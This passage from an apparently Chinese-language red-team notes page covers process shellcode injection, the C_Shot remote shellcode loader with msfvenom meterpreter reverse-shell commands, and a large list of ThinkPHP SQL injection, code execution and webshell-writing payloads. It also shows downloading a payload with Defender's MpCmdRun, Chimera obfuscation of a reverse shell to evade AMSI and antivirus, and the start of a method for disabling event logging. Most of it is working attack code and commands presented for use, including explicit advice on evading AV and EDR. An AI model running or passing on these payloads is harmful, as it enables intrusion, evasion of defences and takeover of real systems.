我们需要选择一个向其注入shellcode的进程，然后需要检索该过程的句柄，以便可以对其执行一些操作，我们将使用OpenProcess win32 API
</code></pre>
<p><img src="762.png" alt="image"></p>
<pre><code>该代码将您要获取其句柄的进程ID作为第一个参数，然后它将使用具有PROCESS_ALL_ACCESS访问权限的OpenProcess()来打开该进程并将该句柄保存在变量process中，最后，为我们打印
</code></pre>
<p><img src="763.png" alt="image"></p>
<pre><code>成功检索到该句柄
检索句柄后的下一步将是在该进程内分配空间，我们可以使用VirtualAllocEx()
</code></pre>
<p><img src="764.png" alt="image"></p>
<pre><code>base_address代表分配的内存的地址
16行，我们将打印分配的内存的地址，并将其写入数据
</code></pre>
<p><img src="765.png" alt="image"></p>
<pre><code>0x29d0000作为地址，
使用x64dbg附加explorer.exe进程，转到这里看看
</code></pre>
<p><img src="766.png" alt="image"></p>
<pre><code>可以看到函数VirtualAllocEx已为我们在explorer.exe中分配了内存空间，我们准备写入数据。
接下来我们解码shellcode并写到内存中
即使使用这种类型（这里用的是异或）的编码，我们的shellcode也可能会被标记，因此请确保在操作中使用之前使用更强的编码并对其进行测试。
这里为测试就只使用的0x01
</code></pre>
<p><img src="767.png" alt="image"></p>
<pre><code>这段代码将使用密钥0x01对每个字节进行解码后，将我们的shellcode写入内存中
运行
</code></pre>
<p><img src="768.png" alt="image"></p>
<pre><code>如图所见，我们将每个字节写入地址，现在我们用x64dbg进行调试，然后转到地址 0x3ce0000查看一下：
</code></pre>
<p><img src="769.png" alt="image"></p>
<pre><code>可以看到shellcode已经写入进去了。
下一步就是执行shellcode了
使用CreateRemoteThread()函数来执行
</code></pre>
<p><img src="770.png" alt="image"><br><img src="771.png" alt="image"><br><img src="772.png" alt="image"></p>
<h2 id="cshot-shellcode远程加载器"><a href="#cshot-shellcode远程加载器" class="headerlink" title="cshot shellcode远程加载器"></a>cshot shellcode远程加载器</h2><pre><code>From:
https://github.com/anthemtotheego/C_Shot
http://blog.redxorblue.com/2020/07/cshot-just-what-doctor-ordered.html
C_Shot是一种用C语言编写的攻击性安全工具，旨在通过HTTP / HTTPS下载远程shellcode二进制文件（.bin），注入并执行shellcode。
1.shellcode注入其自己的进程
2.使用父进程欺骗将shellcode注入子进程
使用C_Shot之类的工具的好处是，我们要执行的恶意代码没有存储在二进制文件中，而是从远程位置检索，读入内存然后执行。这有助于使诸如C_Shot之类的工具对AV / EDR显得相当友好，并且不会被发现。
</code></pre>
<p><img src="773.png" alt="image"></p>
<pre><code>cl / D _UNICODE / D UNICODE cshot.c
</code></pre>
<p><img src="774.png" alt="image"></p>
<pre><code>生成分阶段payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -a x64 --platform windows -b &quot;\x00&quot; -f raw -o /root/Desktop/DefaultStaged.bin
生成无阶段payload
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST= IP LPORT= PORT -a x64 --platform windows -b &quot;\x00&quot; -f raw -o /root/Desktop/DefaultStageless.bin
现在我们已经建立了二进制文件，现在需要一个Web服务。例如运行python -m SimpleHTTPServer 80，或者将它们托管在外部某个地方。对于本文中的所有示例，我将使用github托管shellcode。
</code></pre>
<p><img src="775.png" alt="image"></p>
<pre><code>确保windows defender打开。
</code></pre>
<p><img src="776.png" alt="image"></p>
<pre><code>注入到自己的进程中
</code></pre>
<p><img src="777.png" alt="image"></p>
<pre><code>测试分阶段的shellcode会被windows defender拦截
</code></pre>
<p><img src="778.png" alt="image"></p>
<pre><code>无阶段的shellcode不会被拦截
</code></pre>
<p><img src="779.png" alt="image"></p>
<pre><code>获得shell
</code></pre>
<p><img src="780.png" alt="image"></p>
<pre><code>测试分阶段shellcode欺骗父进程方法：
</code></pre>
<p><img src="781.png" alt="image"><br><img src="782.png" alt="image"></p>
<pre><code>获得shell
</code></pre>
<p><img src="783.png" alt="image"></p>
<pre><code>现在测试下CrowdStrike
注入到自己的进程，两种shellcode都被拦截
</code></pre>
<p><img src="784.png" alt="image"><br><img src="785.png" alt="image"></p>
<pre><code>欺骗父进程
</code></pre>
<p><img src="786.png" alt="image"></p>
<pre><code>获得shell
</code></pre>
<p><img src="787.png" alt="image"><br><img src="788.png" alt="image"></p>
<pre><code>分阶段和无阶段的shellcode在使用欺骗父进程方法时都可以绕过av。
此工具在公共发行版中，没有进行任何形式的API隐藏，字符串混淆，内存保护技巧等工作。如果未进行任何修改，则对该工具的静态分析应该很容易发现。
</code></pre>
<h2 id="thinkphp渗透手段"><a href="#thinkphp渗透手段" class="headerlink" title="thinkphp渗透手段"></a>thinkphp渗透手段</h2><p><img src="840.png" alt="image"></p>
<pre><code>thinkphp 3.2.3
where注入
利用字符串方式作为where传参时存在注入
1) and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)--+
exp注入
这里使用全局数组进行传参(不要用I方法)，漏洞才能生效
public function  getuser()&#123;
    $User = D(&#39;User&#39;);
    $map = array(&#39;id&#39; =&gt; $_GET[&#39;id&#39;]);
    $user = $User-&gt;where($map)-&gt;find();
    dump($user);
&#125;
id[0]=exp&amp;id[1]==1 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))--+
bind注入
public function  getuser()&#123;
    $data[&#39;id&#39;] = I(&#39;id&#39;);
    $uname[&#39;username&#39;] = I(&#39;username&#39;);
    $user = M(&#39;User&#39;)-&gt;where($data)-&gt;save($uname);
    dump($user);
&#125;
id[0]=bind&amp;id[1]=0 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))&amp;username=fanxing
find/select/delete注入
public function getuser()&#123;
$user = M(&#39;User&#39;)-&gt;find(I(&#39;id&#39;));
dump($user);
&#125;
?id[where]=1 and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)
order by注入
public function user()&#123;
$data[&#39;username&#39;] = array(&#39;eq&#39;,&#39;admin&#39;);
$user = M(&#39;User&#39;)-&gt;where($data)-&gt;order(I(&#39;order&#39;))-&gt;find();
dump($user);
&#125;
order=id and(updatexml(1,concat(0x7e,(select user())),0))
此文转自酒仙桥六号部队
TP5
开启debug下的数据库连接
tp5.0.*在debug模式下如果在数据交互点构造如sql注入、空参数等方式使数据库查询等出错，在一定情况下可能导致数据库账号密码直接显示出来。（报错信息太细了不仔细容易忽略掉）
</code></pre>
<p><img src="789.png" alt="image"></p>
<pre><code>在debug模式下找注入点也可以通过报错语句进行构造，并且由于debug模式可能导致本来没有回显的注入变成报错注入。当然目标数据库无法外连的时候，这个注入就挺有用的了。
</code></pre>
<p><img src="790.png" alt="image"></p>
<pre><code>关于log文件的利用
log文件是runtime/log目录下的，比较常见的路径类似：
/runtime/log/2020001/01.log ，默认是启用的，关于该文件主要有以下三点利用方式。
1.关于http请求的部分
常见的log文件会记录http请求，如果对应的站点存在后台等登陆，可以通过记录请求中的cookie登陆后台。
</code></pre>
<p><img src="791.png" alt="image"></p>
<pre><code>2.关于构造sql注入
某些配置下日志还会记录sql语句的执行和报错，可以用于构造sql注入，但是一般这种利用比较少，需要先找到数据交互点然后和日志中记录的赋值以及报错一一对应。
3.关于cache文件名
tp下通过缓存文件获取webshell是一个老生常谈的问题，白盒下理论上都说得通，但是实际上在使用该漏洞的时候是存在部分难点的，如生成cache文件的方式，cache文件名等。
在log文件中可能存在cache文件生成时的报错，这样可以确定目标tp的cache文件命名方式等，举个例子：
在某次渗透中目标tp的log文件。
</code></pre>
<p><img src="792.png" alt="image"></p>
<pre><code>可以注意到这里由于生成缓存文件出错，导致直接将缓存文件的文件名输出。根据输出的缓存文件名去猜测生成规则，由于tp5的缓存文件命名默认是md5(value)，所以大部分时候可以把文件名等带进value进行比对。
这里通过猜测和比对确定是view的文件绝对路径生成的cache文件名。
</code></pre>
<p><img src="793.png" alt="image"></p>
<pre><code>一般来说使用php原生的md5函数去生成md5比较稳妥，笔者为了方便直接在线加密的。
这里基本上就排除了cache getshell的一大难题。之后正常去寻找能进库的交互点，比如发帖，留言这种，就能想办法获取webshell了。
tp5路由
thinkphp系列的官方开发文档是期望网站运维人员将public设置为web根目录，即使用./public/index.php作为入口文件。在实际的渗透过程中由于thinkphp是框架涉及很多二次开发，部分开发人员会选择自定义一个入口文件而不置于public目录下，如/var/www/html/index.php的形式。这里会涉及到打exp的路由问题，由于部分开发人员自定的入口文件可能导致调用的路径出现差异。
一般来说打exp的时候尽量使用./public/index.php来打，以下列exp为例：
?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
可能会出现例如：
http://xxx/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
http://xxx/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
http://xxx/index.php?s=\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
所以很多时候不是打一个exp无效就代表没洞，在黑盒测试的时候可能只是没有找对路由。
下面是实战中的案例：
</code></pre>
<p><img src="794.png" alt="image"></p>
<pre><code>可以看到如果以常规的exp进行测试是返回方法不存在的，因为原生路由被二次开发修改了，所以最终代码执行的payload如下：
</code></pre>
<p><img src="795.png" alt="image"></p>
<pre><code>5.0.*和5.1.*
相对来说5.0可利用的exp比较5.1要多一些，5.1主要的利用方式还是上面举例用的exp。
App.php出现问题的代码如下：
</code></pre>
<p><img src="796.png" alt="image"></p>
<pre><code>其实就是把反斜杠认定为类名，最终使得类实例化，具体的分析在这里就不拿出来水字数了。
而在渗透的过程中大的思路其实是差不多的，尝试多种exp，尝试读log文件等，可以通过简单比对两个版本的目录结构在没有其他信息的情况下判断版本。
TP5：
</code></pre>
<p><img src="797.png" alt="image"></p>
<pre><code>TP5.1：
</code></pre>
<p><img src="798.png" alt="image"></p>
<pre><code>如果网站不是以/public/作为根目录的话，又没通过报错直接体现版本的，可以通过访问目录看目录是否存在来做判断比如访问./thinkphp/，这里不推荐通过/app/目录来做判断，因为笔者遇到过很多开发者会修改这个目录，比方说改成/apps/，/applications/，也就无法准确判断是5.1还是5.0。
tp3的渗透思路
tp3 关于log文件相关的利用同上，目录一般为./Application/Runtime/logs/xxx/xx_xx_xx.log ，其中xxx为app名，文件名为年_月_日.log，如：
Application\Runtime\Logs\Home\16_09_09.log。
sql注入
tp3的sql注入指的是框架层面的注入问题，即二次开发的时候如果调用了model内的find, delete, select方法的话，就可能出现注入问题。
对于白盒测试而言，只要model.class.php没修复然后找到调用了方法的地方就可以挖掘到注入。
以select方法简单做个分析。
Model.class.php
</code></pre>
<p><img src="799.png" alt="image"></p>
<pre><code>函数可以接受一个options参数，为了构成注入肯定是要进入到_parseOptions方法，也就是要绕过两次判断，也就是只要传输的options为数组，同时主键不是数组，就能进到_parseOptions方法。
</code></pre>
<p><img src="800.png" alt="image"></p>
<pre><code>可以看到传入options[&#39;table&#39;]或options[&#39;alias&#39;]且设置options[&#39;where&#39;]值为字符串，最终会options直接返回，整个过程是没有过滤的，然后进到ThinkPHP\Libray\Think\Db\Diver.class.php，进到select方法。
</code></pre>
<p><img src="801.png" alt="image"></p>
<pre><code>可以看到sql语句是最后的parseSql生成的。
</code></pre>
<p><img src="802.png" alt="image"></p>
<pre><code>跟进到parseWhere方法，只要绕过if，最终的return的sql语句是直接拼接的，也就是注入的产生原因，会直接带入select方法执行。
</code></pre>
<p><img src="803.png" alt="image"></p>
<pre><code>黑盒测试也比较类似，一般情况下找到数据库交互点后进行注入尝试即可。
cache写shell
cache写webshell的难点在于cache文件名的确定，一般情况下是md5(绝对路径)生成的cache文件，上文也提到某些情况下可以通过log文件确定cache文件名称
cache文件写入的时候会被注释，所以需要通过%0d%0a提行绕过注释。
所以最终的payload一般为：

%0d%0aeval($_POST[&#39;cmd&#39;]);%0d%0a//
找到参数影响页面的点后通过传参写入webshell，本地可以复现，实战中倒是没遇到过。
tp3渗透主要思路
tp3的渗透在实战中利用的点比较少，所以一般而言遇到tp3的目标，最主要的思路在于找log，然后通过log去看有没有后台之类的，相对来说较一起会比对框架的注入，cache写shell等靠谱。
tp3 关于log文件相关的利用同tp5，目录一般为./Application/Runtime/logs/xxx/xx_xx_xx.log ，其中xxx为app名，文件名为年_月_日.log，如：
Application\Runtime\Logs\Home\16_09_09.log，文件名的格式可能会有变化，多尝试一下一般也能找到。
tp6的新型问题
tp6的利用链
关于model.php的__destruct()方法调用其他类__tostring()方法的文已经有人发过了，但是文中把poc打码了，这里简单跟一下。
</code></pre>
<p><img src="804.png" alt="image"></p>
<pre><code>将对象的lazySave属性设置为True进入save方法：
</code></pre>
<p><img src="805.png" alt="image"></p>
<pre><code>然后进updateData方法：
</code></pre>
<p><img src="806.png" alt="image"></p>
<pre><code>在checkAllowFields方法中调用db方法，图中方法中框起来的语句是可以拼接的，只需要将这两个属性中的一个设置为类对象，即可触发对象的__toString方法。之后的利用方式和tp5.*相同。
</code></pre>
<p><img src="807.png" alt="image"><br><img src="808.png" alt="image"></p>
<pre><code>接着与tp5.*后的gadget是一致的，最终目的是要这个效果实现代码执行。
</code></pre>
<p><img src="809.png" alt="image"></p>
<pre><code>接下来是构造poc，由于测试利用链，笔者手写了一个unserialize。
</code></pre>
<p><img src="810.png" alt="image"></p>
<pre><code>然后通过Dido1960大佬的poc代码生成payload。
poc参见：
https://github.com/Dido1960/thinkphp/blob/master/v6.0.x/poc/poc.php
</code></pre>
<p><img src="811.png" alt="image"></p>
<pre><code>该利用链需求一个反序列化的可控点，二次开发在使用unserialize后可能导致代码执行。同时也可能利用该问题构成一个tp6的后门，如已经通过其他方式获取服务器权限，则可在某些地方加入unserialize函数实现反序列化的一个后门。
所有poc
Thinkphp5 rce poc
利用工具
https://github.com/wh1t3p1g/phpggc
https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection
thinkphp 5.0.22
1、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&amp;name=database.username
2、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&amp;name=database.password
3、http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
4、http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
thinkphp 5
5、http://127.0.0.1/tp5/public/?s=index/\think\View/display&amp;content=%22%3C?%3E%3C?php%20phpinfo();?%3E&amp;data=1
thinkphp 5.0.21
6、http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
7、http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
thinkphp 5.1.*
8、http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1
9、http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=system&amp;data=cmd
10、http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E
11、http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3E
12、http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
13、http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd
14、http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
15、http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd
未知版本
16、?s=index/\think\module/action/param1/$&#123;@phpinfo()&#125;
17、?s=index/\think\Module/Action/Param/$&#123;@phpinfo()&#125;
18、?s=index/\think/module/aciton/param1/$&#123;@print(THINK_VERSION)&#125;
19、index.php?s=/home/article/view_recent/name/1&#39;
header = &quot;X-Forwarded-For:1&#39;) and extractvalue(1, concat(0x5c,(select md5(233))))#&quot;
20、index.php?s=/home/shopcart/getPricetotal/tag/1%27
21、index.php?s=/home/shopcart/getpriceNum/id/1%27
22、index.php?s=/home/user/cut/id/1%27
23、index.php?s=/home/service/index/id/1%27
24、index.php?s=/home/pay/chongzhi/orderid/1%27
25、index.php?s=/home/pay/index/orderid/1%27
26、index.php?s=/home/order/complete/id/1%27
27、index.php?s=/home/order/complete/id/1%27
28、index.php?s=/home/order/detail/id/1%27
29、index.php?s=/home/order/cancel/id/1%27
30、index.php?s=/home/pay/index/orderid/1%27)%20UNION%20ALL%20SELECT%20md5(233)--+
31、POST /index.php?s=/home/user/checkcode/ HTTP/1.1
Content-Disposition: form-data; name=&quot;couponid&quot;
1&#39;) union select sleep(&#39;&#39;&#39;+str(sleep_time)+&#39;&#39;&#39;)#
thinkphp 5.0.23（完整版）debug模式
32、(post)public/index.php (data)_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=touch%20/tmp/xxx
thinkphp 5.0.23(完整版)
33、（post）public/index.php?s=captcha (data) _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls -al
thinkphp 5.0.10（完整版）
34、(post)public/index.php?s=index/index/index (data)s=whoami&amp;_method=__construct&amp;method&amp;filter[]=system
thinkphp 5.1.* 和 5.2.* 和 5.0.*
35、(post)public/index.php (data)c=exec&amp;f=calc.exe&amp;_method=filter
Thinkphp5 注入 poc
需开启app_debug
http://yoursite/index/index/index?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1
http://localhost:8000/index/index/index?username[0]=point&amp;username[1]=1&amp;username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]=0
http://localhost:8000/index/index/index?username=) union select updatexml(1,concat(0x7,user(),0x7e),1)#
http://localhost:8000/index/index/index?username[0]=not like&amp;username[1][0]=%%&amp;username[1][1]=233&amp;username[2]=) union select 1,user()#
http://localhost:8000/index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1
http://localhost:8000/index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23
Thinkphp5 文件包含 poc
5.0.0&lt;=ThinkPHP5&lt;=5.0.18 、5.1.0&lt;=ThinkPHP&lt;=5.1.10
创建 application/index/view/index/index.html 文件，内容随意（没有这个模板文件的话，在渲染时程序会报错），并将图片马 1.jpg 放至 public 目录下（模拟上传图片操作）。接着访问     http://localhost:8000/index/index/index?cacheFile=demo.php 链接，即可触发 文件包含漏洞 。
Thinkphp5 代码执行poc
5.0.0&lt;=ThinkPHP5&lt;=5.0.10
http://localhost/tpdemo/public/?username=mochazz123%0d%0a@eval($_GET[_]);//
http://localhost:8000/index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
ThinkPHP &lt;= 5.0.13
POST /?s=index/index
s=whoami&amp;_method=__construct&amp;method=&amp;filter[]=system
ThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debug
POST /
_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -al

ThinkPHP &lt;= 5.0.23 需要存在xxx的method路由，例如captcha
POST /?s=xxx HTTP/1.1
_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls+-al
_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls
写shell进日志
_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=&lt;?php eval($_POST[&#39;x&#39;])?&gt;
&amp;
写shell进session
POST /?s=captcha HTTP/1.1
Cookie: PHPSESSID=kking
_method=__construct&amp;filter[]=think\Session::set&amp;method=get&amp;get[]=&lt;?php eval($_POST[&#39;x&#39;])?&gt;&amp;server[]=1
&amp;
包含session getshell
POST /?s=captcha
_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;get[]=tmp\sess_kking&amp;server[]=1
通过日志包含getshell
_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=../data/runtime/log/201901/21.log&amp;x=phpinfo();
&amp;
POST /?s=captcha
Cookie: PHPSESSID=kking
_method=__construct&amp;filter[]=think\Session::set&amp;method=get&amp;get[]=abPD9waHAgQGV2YWwoJF9HRVRbJ3InXSk7Oz8%2bab&amp;server[]=1
+号用urlencode编码为%2b，前后加ab为了凑足解码
/?s=captcha&amp;r=phpinfo();
_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;get[]=php://filter/read=convert.base64-decode/resource=c:\www\tmp\sess_kking&amp;server[]=1
&amp;
POST /?s=captcha&amp;r=phpinfo();
Cookie: PHPSESSID=kking
_method=__construct&amp;method=get&amp;filter[]=base64_decode&amp;filter[]=think\__include_file&amp;get[]=cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPWM6XHd3d1x0bXBcc2Vzc19ra2luZw==&amp;server[]=1
&amp;
设置session
POST /?s=captcha
Cookie: PHPSESSID=kktest

_method=__construct&amp;filter[]=think\Session::set&amp;method=get&amp;get[]=abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2bab&amp;server[]=1
文件包含
POST /?s=captcha&amp;r=cGhwaW5mbygpOw==

_method=__construct&amp;filter[]=strrev&amp;filter[]=think\__include_file&amp;method=get&amp;server[]=1&amp;get[]=tsetkk_sses/pmt/=ecruoser/edoced-46esab.trevnoc=daer/retlif//:php
Thinkphp6 任意文件创建
需可控session参数，如username
/index.php?username=&lt;?php phpinfo();?&gt;
Cookie:1234567890123456789012345670.php
Cookie需32位
在runtime\session下生成
sess_1234567890123456789012345670.php文件
</code></pre>
<h2 id="使用windows-defender下载文件"><a href="#使用windows-defender下载文件" class="headerlink" title="使用windows defender下载文件"></a>使用windows defender下载文件</h2><pre><code>C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0&gt;MpCmdRun.exe -DownloadFile -url http://192.168.2.105:8000/payload.c -path c:\\users\\test\\desktop\\1.c
</code></pre>
<p><img src="812.png" alt="image"></p>
<pre><code>其他利用
</code></pre>
<p><img src="812-2.png" alt="image"><br><img src="812-3.jfif" alt="image"><br><img src="812-4.jfif" alt="image"></p>
<h2 id="Powershell脚本混淆绕过amsi和av"><a href="#Powershell脚本混淆绕过amsi和av" class="headerlink" title="Powershell脚本混淆绕过amsi和av"></a>Powershell脚本混淆绕过amsi和av</h2><pre><code>https://github.com/tokyoneon/Chimera
以下是Invoke-PowerShellTcp.ps1的片段
</code></pre>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">stream = <span class="variable">$client</span>.GetStream()</span></span><br><span class="line"><span class="meta">[byte[]]$</span><span class="bash">bytes = 0..65535|%&#123;0&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">Send back current username and computername</span></span><br><span class="line"><span class="meta">$</span><span class="bash">sendbytes = ([text.encoding]::ASCII).GetBytes(<span class="string">&quot;Windows PowerShell running as user &quot;</span> + <span class="variable">$env</span>:username + <span class="string">&quot; on &quot;</span> + <span class="variable">$env</span>:computername + <span class="string">&quot;`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n&quot;</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">stream.Write(<span class="variable">$sendbytes</span>,0,<span class="variable">$sendbytes</span>.Length)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">Show an interactive PowerShell prompt</span></span><br><span class="line"><span class="meta">$</span><span class="bash">sendbytes = ([text.encoding]::ASCII).GetBytes(<span class="string">&#x27;PS &#x27;</span> + (Get-Location).Path + <span class="string">&#x27;&gt;&#x27;</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">stream.Write(<span class="variable">$sendbytes</span>,0,<span class="variable">$sendbytes</span>.Length)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="813.png" alt="image"></p>
<pre><code>经过Chimera处理后
</code></pre>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Watched anxiously by the Rebel <span class="built_in">command</span>, the fleet of small, single-pilot fighters speeds toward the massive, impregnable Death Star.</span></span><br><span class="line">              $xdgIPkCcKmvqoXAYKaOiPdhKXIsFBDov = $jYODNAbvrcYMGaAnZHZwE.&quot;$bnyEOfzNcZkkuogkqgKbfmmkvB$ZSshncYvoHKvlKTEanAhJkpKSIxQKkTZJBEahFz$KKApRDtjBkYfJhiVUDOlRxLHmOTOraapTALS&quot;()</span><br><span class="line">       # As the station slowly moves into position to obliterate the Rebels, the pilots maneuver down a narrow trench along the station’s equator, where the thermal port lies hidden.</span><br><span class="line">          [bYte[]]$mOmMDiAfdJwklSzJCUFzcUmjONtNWN = 0..65535|%&#123;0&#125;</span><br><span class="line"><span class="meta">   #</span><span class="bash"> Darth Vader leads the counterattack himself and destroys many of the Rebels, including Luke’s boyhood friend Biggs, <span class="keyword">in</span> ship-to-ship combat.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Finally, it is up to Luke himself to make a run at the target, and he is saved from Vader at the last minute by Han Solo, who returns <span class="keyword">in</span> the nick of time and sends Vader spinning away from the station.</span></span><br><span class="line">           # Heeding Ben’s disembodied voice, Luke switches off his computer and uses the Force to guide his aim.</span><br><span class="line"><span class="meta">   #</span><span class="bash"> Against all odds, Luke succeeds and destroys the Death Star, dealing a major defeat to the Empire and setting himself on the path to becoming a Jedi Knight.</span></span><br><span class="line">           $PqJfKJLVEgPdfemZPpuJOTPILYisfYHxUqmmjUlKkqK = ([teXt.enCoDInG]::AsCII).&quot;$mbKdotKJjMWJhAignlHUS$GhPYzrThsgZeBPkkxVKpfNvFPXaYNqOLBm&quot;(&quot;WInDows Powershell rUnnInG As User &quot; + $TgDXkBADxbzEsKLWOwPoF:UsernAMe + &quot; on &quot; + $TgDXkBADxbzEsKLWOwPoF:CoMPUternAMe + &quot;`nCoPYrIGht (C) 2015 MICrosoft CorPorAtIon. All rIGhts reserveD.`n`n&quot;)</span><br><span class="line"><span class="meta">#</span><span class="bash"> Far off <span class="keyword">in</span> a distant galaxy, the starship belonging to Princess Leia, a young member of the Imperial Senate, is intercepted <span class="keyword">in</span> the course of a secret mission by a massive Imperial Star Destroyer.</span></span><br><span class="line">            $xdgIPkCcKmvqoXAYKaOiPdhKXIsFBDov.WrIte($PqJfKJLVEgPdfemZPpuJOTPILYisfYHxUqmmjUlKkqK,0,$PqJfKJLVEgPdfemZPpuJOTPILYisfYHxUqmmjUlKkqK.LenGth)</span><br><span class="line"><span class="meta">   #</span><span class="bash"> An imperial boarding party blasts its way onto the captured vessel, and after a fierce firefight the crew of Leia’s ship is subdued.</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>VirusTotal报告检测到0个
</code></pre>
<p><img src="814.png" alt="image"></p>
<pre><code>Kali下安装
sudo apt-get update &amp;&amp; sudo apt-get install -Vy sed xxd libc-bin curl jq perl gawk grep coreutils git
sudo git clone https://github.com/tokyoneon/chimera /opt/chimera
sudo chown $USER:$USER -R /opt/chimera/; cd /opt/chimera/
sudo chmod +x chimera.sh; ./chimera.sh --help
在shells /目录中有几个Nishang脚本和一些通用脚本。所有都已经过测试
使用脚本之前，请将硬编码的IP地址（192.168.56.101）更改为您的Kali地址。
/opt/chimera$ sed -i &#39;s/192.168.56.101/&lt;YOUR-IP-ADDRESS&gt;/g&#39; shells/*.ps1
所有脚本的默认端口为4444。如果需要，再次使用sed进行更改。
/opt/chimera$ sed -i &#39;s/4444/&lt;YOUR-DESIRED-PORT&gt;/g&#39; shells/*.ps1
f：输入文件。
-o：输出文件。
-g：从脚本中省略几个Nishang特定的特征。
-v：替换变量名称。
-t：替换数据类型。
-j：替代函数名称。
-i：在每一行中插入任意注释。
-c：用任意数据替换注释。
-h：将IP地址转换为十六进制格式。
-s：替换各种字符串。
-b：在可能的情况下反引号字符串。
-e：过程完成后，检查混淆文件。
举例，nc反弹shell
nc -v -l -p 4444
把混淆好的脚本传入目标
PS&gt; powershell.exe -ep bypass C:\path\to\chimera.ps1
获得shell
nc -v -l -p 4444

listening on [any] 4444 ...
192.168.56.105: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.107] from (UNKNOWN) [192.168.56.105] 49725
Windows PowerShell running as user  on
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\target&gt;
一些使用说明
https://github.com/tokyoneon/Chimera/blob/master/USAGE.md
</code></pre>
<h2 id="通过挂起EventLog服务线程禁用Windows事件日志"><a href="#通过挂起EventLog服务线程禁用Windows事件日志" class="headerlink" title="通过挂起EventLog服务线程禁用Windows事件日志"></a>通过挂起EventLog服务线程禁用Windows事件日志</h2><pre><code>Windows事件日志由svchost.exe托管处理。EventLog
如果我们列出svchost进程，则会看到许多这样的进程：
</code></pre>
<p><img src="815.png" alt="image"></p>
<pre><code>从上面的屏幕截图中，尚不清楚哪个进程真正托管了该服务，但是如果我们继续在Process Hacker中逐个检查进程，我们最终将找到托管该服务的进程，当前为pid 2196：EventLog svchost.exe
</code></pre>
<p><img src="816.png" alt="image"></p>
<pre><code>通过以下命令获得eventlog的进程ID
Get-WmiObject -Class win32_service -Filter &quot;name = &#39;eventlog&#39;&quot; | select -exp ProcessId
</code></pre>
<p><img src="817.png" alt="image"></p>
<pre><code>如果我们查看的svchost.exe线程，则会看到
</code></pre>
